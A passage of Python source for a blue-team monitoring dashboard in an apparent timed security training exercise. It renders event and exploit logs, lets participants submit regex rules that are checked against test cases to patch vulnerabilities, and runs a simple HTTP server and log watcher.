            f'  <span style="padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;'
            f'  background:{lv_bg};color:{lv_color};border:1px solid {lv_border}">{lv}</span>'
            f'</td>'
            f'<td style="padding:14px 14px;min-width:480px">{status_block}</td>'
            f'</tr>'
        )

    # ── Vuln map rows ──
    vuln_map_rows = ""
    for v in VULNS:
        vid = v["id"]
        lv_color  = "#00ff88" if v["level"] == "Easy" else "#ffa502"
        lv_bg     = "rgba(0,255,136,0.08)" if v["level"] == "Easy" else "rgba(255,165,2,0.08)"
        lv_border = "rgba(0,255,136,0.3)"  if v["level"] == "Easy" else "rgba(255,165,2,0.3)"
        st_color  = "#00ff88" if patches.get(vid, False) else "#ff4757"
        st_label  = "&#128274; Patched" if patches.get(vid, False) else "&#128275; Vulnerable"
        vuln_map_rows += (
            f'<tr>'
            f'<td style="color:#475569">{v["num"]}</td>'
            f'<td style="color:#dde4f0;font-weight:600">{v["name"]}</td>'
            f'<td style="color:#475569;font-family:monospace;font-size:11px">{v["endpoint"]}</td>'
            f'<td><span style="padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;'
            f'background:{lv_bg};color:{lv_color};border:1px solid {lv_border}">{v["level"]}</span></td>'
            f'<td style="color:{st_color};font-family:monospace;font-size:12px;font-weight:700">{st_label}</td>'
            f'</tr>'
        )

    # ── Exploit Success Log ──
    exploit_log_html = ""
    for ex in exploit_successes[:50]:
        lv = ex["level"]
        lv_color  = "#00ff88" if lv == "Easy" else ("#ffa502" if lv == "Intermediate" else "#ef4444")
        lv_bg     = "rgba(0,255,136,0.08)" if lv == "Easy" else ("rgba(255,165,2,0.08)" if lv == "Intermediate" else "rgba(239,68,68,0.08)")
        lv_border = "rgba(0,255,136,0.3)"  if lv == "Easy" else ("rgba(255,165,2,0.3)"  if lv == "Intermediate" else "rgba(239,68,68,0.3)")
        exploit_log_html += (
            f'<div style="display:flex;align-items:center;gap:12px;padding:10px 14px;'
            f'background:#060d18;border:1px solid #1a2535;border-radius:6px;'
            f'border-left:3px solid {ex["color"]}">'
            f'  <span style="font-family:monospace;font-size:11px;color:#475569;white-space:nowrap;flex-shrink:0">{ex["time"]}</span>'
            f'  <span style="font-size:13px;font-weight:700;color:#00ff88">&#10003;</span>'
            f'  <div style="flex:1;min-width:0">'
            f'    <div style="font-weight:700;color:#dde4f0;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'
            f'      {ex["vuln_name"]}</div>'
            f'    <div style="font-size:11px;color:#64748b;font-family:monospace">'
            f'      {ex["attack"]} &nbsp;|&nbsp; IP: {ex["ip"]} &nbsp;|&nbsp; {ex["endpoint"]}</div>'
            f'  </div>'
            f'  <span style="padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;'
            f'  background:{lv_bg};color:{lv_color};border:1px solid {lv_border};flex-shrink:0">{lv}</span>'
            f'  <span style="padding:2px 8px;border-radius:3px;font-size:11px;font-weight:700;flex-shrink:0;'
            f'  background:rgba(0,255,136,0.1);color:#00ff88;border:1px solid rgba(0,255,136,0.3)">EXPLOITED</span>'
            f'</div>'
        )
    if not exploit_log_html:
        exploit_log_html = '<div style="text-align:center;padding:2rem;color:#475569;font-size:13px">No successful exploits recorded yet</div>'

    c_crit = "#ff5555" if stats["critical"] > 0 else "#1e2d40"
    c_high = "#ff4757" if stats["high"]     > 0 else "#1e2d40"
    c_med  = "#ffa502" if stats["medium"]   > 0 else "#1e2d40"
    c_low  = "#94a3b8" if stats["low"]      > 0 else "#1e2d40"

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Blue Team Monitor — Nexsus</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500;700&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    :root{{
      --bg:#050810;--bg2:#0b0f1a;--bg3:#111827;--bd:#1a2535;
      --accent:#00e5ff;--green:#00ff88;--red:#ff4757;--amber:#ffa502;
      --text:#dde4f0;--muted:#64748b;
    }}
    *{{box-sizing:border-box;margin:0;padding:0}}
    body{{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;font-size:14px;min-height:100vh}}
    body::before{{content:'';position:fixed;inset:0;
      background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,229,255,0.005) 3px,rgba(0,229,255,0.005) 4px);
      pointer-events:none;z-index:9999}}
    nav{{background:rgba(5,8,16,0.97);backdrop-filter:blur(10px);border-bottom:1px solid var(--bd);
         padding:0 2rem;display:flex;align-items:center;justify-content:space-between;height:56px;
         position:sticky;top:0;z-index:200}}
    .brand{{font-family:'Syne',sans-serif;font-weight:800;font-size:20px;color:var(--accent)}}
    .brand em{{color:var(--red);font-style:normal}}
    .live{{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--green);font-family:'JetBrains Mono',monospace}}
    .dot{{width:8px;height:8px;border-radius:50%;background:var(--green);animation:pulse 1.4s infinite}}
    @keyframes pulse{{0%,100%{{opacity:1;box-shadow:0 0 0 0 rgba(0,255,136,0.4)}}50%{{opacity:.4;box-shadow:0 0 0 5px rgba(0,255,136,0)}}}}
    .page{{max-width:1500px;margin:0 auto;padding:1.75rem 2rem}}
    .page-header{{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:1.75rem}}
    h1{{font-family:'Syne',sans-serif;font-weight:800;font-size:26px;line-height:1}}
    h1 small{{display:block;font-family:'DM Sans',sans-serif;font-weight:400;font-size:13px;color:var(--muted);margin-top:4px}}
    .refresh-tag{{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);padding:4px 10px;border:1px solid var(--bd);border-radius:4px}}
    .stats{{display:grid;grid-template-columns:repeat(6,1fr);gap:1rem;margin-bottom:1.75rem}}
    .stat{{background:var(--bg2);border:1px solid var(--bd);border-radius:8px;padding:1.1rem 1rem;text-align:center;position:relative;overflow:hidden}}
    .stat::after{{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:currentColor;opacity:0.25}}
    .stat-n{{font-family:'Syne',sans-serif;font-weight:800;font-size:30px;line-height:1;margin-bottom:3px}}
    .stat-l{{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1.2px;font-weight:600}}
    .panel{{background:var(--bg2);border:1px solid var(--bd);border-radius:10px;overflow:hidden;margin-bottom:1.5rem}}
    .panel-hdr{{padding:1rem 1.5rem;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between;background:rgba(255,255,255,0.012)}}
    .panel-hdr h2{{font-family:'Syne',sans-serif;font-size:14px;font-weight:700;letter-spacing:0.3px}}
    .panel-tag{{font-size:11px;color:var(--muted);font-family:'JetBrains Mono',monospace}}
    table{{width:100%;border-collapse:collapse}}
    th{{text-align:left;padding:9px 14px;font-size:10px;color:var(--muted);border-bottom:1px solid var(--bd);
        text-transform:uppercase;letter-spacing:.8px;background:var(--bg3);font-weight:700}}
    td{{padding:10px 14px;border-bottom:1px solid rgba(26,37,53,0.5);font-family:'JetBrains Mono',monospace;font-size:12px;vertical-align:middle}}
    tr:last-child td{{border-bottom:none}}
    tr:hover td{{background:rgba(255,255,255,0.01)}}
    .patch-progress{{padding:1rem 1.5rem;background:rgba(0,0,0,0.2);border-bottom:1px solid var(--bd)}}
    .progress-bar-track{{height:5px;background:rgba(255,255,255,0.06);border-radius:3px;overflow:hidden;margin-top:8px}}
    .progress-bar-fill{{height:100%;border-radius:3px;transition:width 0.6s ease}}
    .progress-label{{display:flex;justify-content:space-between;font-size:11px;color:var(--muted);font-family:'JetBrains Mono',monospace}}
    /* validation result colours */
    .vr-ok  {{color:#00ff88}}
    .vr-err {{color:#ff4757}}
    .vr-warn{{color:#ffa502}}
    /* toast */
    #toast{{position:fixed;bottom:2rem;right:2rem;padding:12px 20px;border-radius:8px;font-size:13px;
            font-weight:600;font-family:'JetBrains Mono',monospace;z-index:9999;opacity:0;
            transform:translateY(10px);transition:all 0.3s ease;pointer-events:none;max-width:380px}}
    #toast.show{{opacity:1;transform:translateY(0)}}
    .toast-ok {{background:rgba(0,255,136,0.15);color:#00ff88;border:1px solid rgba(0,255,136,0.3)}}
    .toast-err{{background:rgba(255,71,87,0.15);color:#ff4757;border:1px solid rgba(255,71,87,0.3)}}
    .toast-warn{{background:rgba(255,165,2,0.15);color:#ffa502;border:1px solid rgba(255,165,2,0.3)}}
    /* auto-refresh pauses when an input is focused */
    input:focus {{ outline: none; }}
  </style>
</head>
<body>

<nav>
  <span class="brand">Blue<em>Team</em> Monitor <span style="font-size:13px;color:var(--muted);font-family:'DM Sans',sans-serif;font-weight:400">— Nexus Protocol</span></span>
  <div style="display:flex;align-items:center;gap:1.5rem">
    <div id="session-timer" style="font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:700;padding:4px 12px;border-radius:6px;border:1px solid var(--bd);background:rgba(0,229,255,0.05);color:var(--accent)">
      ⏱ {int(session_remaining // 3600):02d}:{int((session_remaining % 3600) // 60):02d}:{int(session_remaining % 60):02d}
    </div>
    <div class="live"><span class="dot"></span>LIVE &middot; auto-refresh 4s (pauses while typing)</div>
  </div>
</nav>

<div class="page">
  <div class="page-header">
    <h1>Security Operations Centre
      <small>Vidyatech University Portal &middot; Write regex rules to patch vulnerabilities in real time</small>
    </h1>
    <span class="refresh-tag">&#8635; {datetime.now().strftime('%H:%M:%S')}</span>
  </div>

  <!-- Stats -->
  <div class="stats">
    <div class="stat" style="color:#dde4f0">
      <div class="stat-n">{stats["total"]}</div><div class="stat-l">Total Events</div>
    </div>
    <div class="stat" style="color:{c_crit}">
      <div class="stat-n">{stats["critical"]}</div><div class="stat-l">Critical</div>
    </div>
    <div class="stat" style="color:{c_high}">
      <div class="stat-n">{stats["high"]}</div><div class="stat-l">High</div>
    </div>
    <div class="stat" style="color:{c_med}">
      <div class="stat-n">{stats["medium"]}</div><div class="stat-l">Medium</div>
    </div>
    <div class="stat" style="color:{c_low}">
      <div class="stat-n">{stats["low"]}</div><div class="stat-l">Low</div>
    </div>
    <div class="stat" style="color:{patch_bar_color}">
      <div class="stat-n">{total_patched}/{len(VULNS)}</div><div class="stat-l">Patched</div>
    </div>
  </div>

  <!-- Patch Submission Panel -->
  <div class="panel">
    <div class="panel-hdr">
      <h2>&#128737; Regex Patch Submission</h2>
      <span class="panel-tag">Write a regex &rarr; Validate &rarr; Patch activates instantly if all test cases pass</span>
    </div>
    <div class="patch-progress">
      <div class="progress-label">
        <span>Defence progress</span>
        <span>{total_patched} of {len(VULNS)} vulnerabilities patched ({patch_bar_w}%)</span>
      </div>
      <div class="progress-bar-track">
        <div class="progress-bar-fill" style="width:{patch_bar_w}%;background:{patch_bar_color}"></div>
      </div>
    </div>
    <table>
      <thead>
        <tr>
          <th style="width:36px">#</th>
          <th style="width:170px">Vulnerability</th>
          <th style="width:220px">Endpoint</th>
          <th style="width:100px">Level</th>
          <th>Regex Rule / Status</th>
        </tr>
      </thead>
      <tbody>{patch_rows}</tbody>
    </table>
  </div>

  <!-- Live Events compact table -->
  <div class="panel">
    <div class="panel-hdr">
      <h2>&#9889; Live Event Log</h2>
      <span class="panel-tag">Showing latest 60 &middot; {len(events)} total captured</span>
    </div>
    <table>
      <thead>
        <tr>
          <th style="width:72px">Time</th>
          <th style="width:200px">Attack Type</th>
          <th style="width:100px">Source IP</th>
          <th style="width:160px">Endpoint</th>
          <th style="width:90px">Severity</th>
          <th style="width:100px">Result</th>
          <th>Raw Log</th>
        </tr>
      </thead>
      <tbody>{rows}</tbody>
    </table>
  </div>

  <!-- Exploit Success Log -->
  <div class="panel">
    <div class="panel-hdr">
      <h2>&#9989; Exploit Success Log</h2>
      <span class="panel-tag">{len(exploit_successes)} confirmed &middot; newest first</span>
    </div>
    <div style="padding:10px 14px;display:flex;flex-direction:column;gap:6px;max-height:400px;overflow-y:auto">
      {exploit_log_html}
    </div>
  </div>

  <!-- Vuln map -->
  <div class="panel">
    <div class="panel-hdr">
      <h2>&#128203; Vulnerability Reference Map</h2>
    </div>
    <table>
      <thead><tr><th>#</th><th>Vulnerability</th><th>Endpoint</th><th>Level</th><th>Live Status</th></tr></thead>
      <tbody>{vuln_map_rows}</tbody>
    </table>
  </div>
</div>

<div id="toast"></div>

<script>
  // ── Session countdown timer ──
  (function() {{
    let remaining = {session_remaining};
    const el = document.getElementById('session-timer');
    function fmt(s) {{
      const h = String(Math.floor(s / 3600)).padStart(2,'0');
      const m = String(Math.floor((s % 3600) / 60)).padStart(2,'0');
      const sec = String(s % 60).padStart(2,'0');
      return '⏱ ' + h + ':' + m + ':' + sec;
    }}
    const tick = setInterval(function() {{
      remaining--;
      if (remaining <= 0) {{
        clearInterval(tick);
        el.textContent = '⏱ 00:00:00';
        el.style.color = '#ff4757';
        document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#050810;color:#dde4f0;font-family:JetBrains Mono,monospace;text-align:center;gap:1rem"><div style="font-size:48px">⏰</div><div style="font-size:24px;color:#ff4757;font-weight:700">SESSION EXPIRED</div><div style="color:#64748b;font-size:14px">The 2-hour event has ended.</div></div>';
        return;
      }}
      if (remaining <= 300) {{
        el.style.color = '#ff4757';
        el.style.borderColor = 'rgba(255,71,87,0.4)';
        el.style.background = 'rgba(255,71,87,0.08)';
      }} else if (remaining <= 600) {{
        el.style.color = '#ffa502';
        el.style.borderColor = 'rgba(255,165,2,0.4)';
        el.style.background = 'rgba(255,165,2,0.08)';
      }}
      el.textContent = fmt(remaining);
    }}, 1000);
  }})();

  // ── Auto-refresh: pause when any input is focused ──
  let focused = false;
  document.addEventListener('focusin',  e => {{ if (e.target.tagName === 'INPUT') focused = true;  }});
  document.addEventListener('focusout', e => {{ if (e.target.tagName === 'INPUT') focused = false; }});
  setInterval(() => {{ if (!focused) location.reload(); }}, 4000);

  // ── Submit regex for validation + apply ──
  async function submitRegex(vulnId, name) {{
    const input = document.getElementById('regex-' + vulnId);
    const resultDiv = document.getElementById('result-' + vulnId);
    const pattern = input ? input.value.trim() : '';
    if (!pattern) {{
      resultDiv.innerHTML = '<span class="vr-err">&#10007; Please enter a regex pattern.</span>';
      return;
    }}

    resultDiv.innerHTML = '<span style="color:#64748b">&#8987; Validating against test cases...</span>';

    try {{
      const res  = await fetch('/validate_regex', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{ vuln_id: vulnId, name: name, pattern: pattern }})
      }});
      const data = await res.json();

      if (data.compile_error) {{
        resultDiv.innerHTML =
          '<span class="vr-err">&#10007; Invalid regex — ' + escHtml(data.compile_error) + '</span>';
        return;
      }}

      // Build result summary
      let html = '<div style="line-height:1.8">';

      if (data.missed.length) {{
        html += '<div class="vr-err">&#10007; Did NOT catch attacks (' + data.missed.length + '): ';
        html += data.missed.map(s => '<code style="background:#1a0a0a;padding:1px 5px;border-radius:3px">' + escHtml(s) + '</code>').join(', ');
        html += '</div>';
      }}
      if (data.false_positives.length) {{
        html += '<div class="vr-warn">&#9888; False positives — blocked safe traffic (' + data.false_positives.length + '): ';
        html += data.false_positives.map(s => '<code style="background:#1a120a;padding:1px 5px;border-radius:3px">' + escHtml(s) + '</code>').join(', ');
        html += '</div>';
      }}
      if (data.ok) {{
        html += '<span class="vr-ok">&#10003; All ' + data.score + ' test cases passed — patch activated!</span>';
      }} else {{
        html += '<span style="color:#64748b">Score: ' + data.score + ' — fix the issues above and resubmit.</span>';
      }}
      html += '</div>';
      resultDiv.innerHTML = html;

      if (data.ok) {{
        showToast('&#10003; Patch live: ' + name, 'ok');
        setTimeout(() => location.reload(), 1200);
      }} else {{
        showToast('&#10007; ' + data.missed.length + ' attack(s) not caught', 'warn');
      }}

    }} catch(e) {{
      resultDiv.innerHTML = '<span class="vr-err">&#10007; Network error — is the monitor running?</span>';
    }}
  }}

  // ── Revert a patch ──
  async function revertPatch(vulnId, name) {{
    try {{
      const res  = await fetch('/patch', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{ vuln_id: vulnId, name: name, enabled: false }})
      }});
      const data = await res.json();
      if (data.ok) {{
        showToast('&#8629; Patch reverted: ' + name, 'warn');
        setTimeout(() => location.reload(), 600);
      }}
    }} catch(e) {{
      showToast('Network error', 'err');
    }}
  }}

  function showToast(msg, type) {{
    const t = document.getElementById('toast');
    t.innerHTML = msg;
    t.className = 'show toast-' + type;
    setTimeout(() => {{ t.className = ''; }}, 3800);
  }}

  function escHtml(s) {{
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }}
</script>
</body>
</html>"""


# ─────────────────────────── HTTP HANDLER ────────────────────────────────────

class Handler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == "/patches":
            body = json.dumps(read_patches(), indent=2).encode()
            self._respond(200, "application/json", body)
        elif self.path == "/api/logs":
            # Return recent log lines as JSON for RoomView
            logs = []
            try:
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, "r", encoding="utf-8", errors="replace") as f:
                        lines = f.readlines()[-200:]
                    for line in lines:
                        line = line.strip()
                        if not line:
                            continue
                        parts = line.split(" | ")
                        entry = {"raw": line, "time": "", "method": "", "path": "", "body": "", "ip": "", "status": ""}
                        if parts:
                            head = parts[0].split()
                            if len(head) >= 2:
                                entry["time"] = head[0]
                                entry["method"] = head[1]
                                entry["path"] = head[2] if len(head) > 2 else ""
                        for p in parts[1:]:
                            if p.startswith("body="):
                                entry["body"] = p[5:]
                            elif p.startswith("ip="):
                                entry["ip"] = p[3:]
                            elif p.startswith("status="):
                                entry["status"] = p[7:]
                        logs.append(entry)
            except Exception as e:
                logs = [{"raw": str(e), "time": "", "method": "ERR", "path": str(e), "body": "", "ip": "", "status": ""}]
            body = json.dumps({"logs": logs}).encode()
            self._respond(200, "application/json", body)
        else:
            body = build_page().encode("utf-8")
            self._respond(200, "text/html; charset=utf-8", body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw    = self.rfile.read(length)

        if self.path == "/validate_regex":
            try:
                data    = json.loads(raw)
                pattern = data.get("pattern", "")
                vuln_id = data.get("vuln_id", "")
                name    = data.get("name", vuln_id)

                result = validate_regex(pattern, vuln_id)

                if result.get("error") and not result["ok"]:
                    body = json.dumps({
                        "ok": False,
                        "compile_error": result["error"],
                        "missed": [], "false_positives": [], "score": "0/0"
                    }).encode()
                    self._respond(200, "application/json", body)
                    return

                if result["ok"]:
                    activate_patch(vuln_id, name, pattern)

                body = json.dumps({
                    "ok":              result["ok"],
                    "compile_error":   None,
                    "passed":          result["passed"],
                    "missed":          result["missed"],
                    "blocked":         result["blocked"],
                    "false_positives": result["false_positives"],
                    "score":           result["score"],
                }).encode()
                self._respond(200, "application/json", body)

            except Exception as e:
                body = json.dumps({"ok": False, "compile_error": str(e), "missed": [], "false_positives": [], "score": "0/0"}).encode()
                self._respond(400, "application/json", body)

        elif self.path == "/patch":
            # Revert endpoint (enable=false) — no regex needed for revert
            try:
                data    = json.loads(raw)
                vuln_id = data.get("vuln_id", "")
                name    = data.get("name", vuln_id)
                enabled = bool(data.get("enabled", True))
                if not enabled:
                    patches = deactivate_patch(vuln_id, name)
                    body    = json.dumps({"ok": True, "patches": patches}).encode()
                    self._respond(200, "application/json", body)
                else:
                    body = json.dumps({"ok": False, "error": "Use /validate_regex to apply patches"}).encode()
                    self._respond(400, "application/json", body)
            except Exception as e:
                body = json.dumps({"ok": False, "error": str(e)}).encode()
                self._respond(400, "application/json", body)

        else:
            self._respond(404, "text/plain", b"Not Found")

    def _respond(self, code, ctype, body):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", len(body))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass


# ─────────────────────────── LOG WATCHER ─────────────────────────────────────

def watch_log():
    print(f"[Monitor] Watching log: {LOG_FILE}")
    while True:
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r", encoding="utf-8", errors="replace") as f:
                    f.seek(0, 2)
                    while True:
                        line = f.readline()
                        if line:
                            analyze(line)
                        else:
                            time.sleep(0.3)
                            f.seek(f.tell())
            else:
                time.sleep(1)
        except Exception as e:
            print(f"[Monitor] Log watcher error: {e}")
            time.sleep(2)


# ─────────────────────────── ENTRY POINT ─────────────────────────────────────

if __name__ == "__main__":
    threading.Thread(target=watch_log, daemon=True).start()

    port = int(os.environ.get("PORT", 8080))
    addr = ("0.0.0.0", port)
    print("""
+----------------------------------------------------------+
|      Blue Team Monitor -- Nexus Protocol                 |
+----------------------------------------------------------+
|  Dashboard      --> http://localhost:8080                |
|  Validate+Apply --> POST /validate_regex                 |
|  Revert patch   --> POST /patch  {enabled: false}        |
|  State          --> GET  /patches                        |
+----------------------------------------------------------+
""")
    http.server.HTTPServer(addr, Handler).serve_forever()